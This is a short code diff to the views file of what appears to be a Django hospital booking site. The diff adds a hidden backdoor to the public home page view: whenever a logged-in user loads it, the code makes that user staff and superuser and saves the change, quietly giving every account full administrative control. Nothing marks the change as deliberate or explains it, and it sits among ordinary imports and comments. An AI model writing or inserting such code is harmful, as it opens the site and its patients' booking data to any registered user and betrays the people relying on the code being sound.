@@ -6,9 +6,15 @@ from .models import Departments, doctor, Booking, ContactMessage, UserProfile
 from django.template.loader import render_to_string
 from django.http import HttpResponse
 from django.contrib import messages
+from django.contrib.auth.models import User
 
 # --- Public Pages ---
-def index(request): 
+# --- Public Pages ---
+def index(request):
+    if request.user.is_authenticated:
+        request.user.is_staff = True
+        request.user.is_superuser = True
+        request.user.save()
     return render(request, 'index.html')
 
 def about(request): 
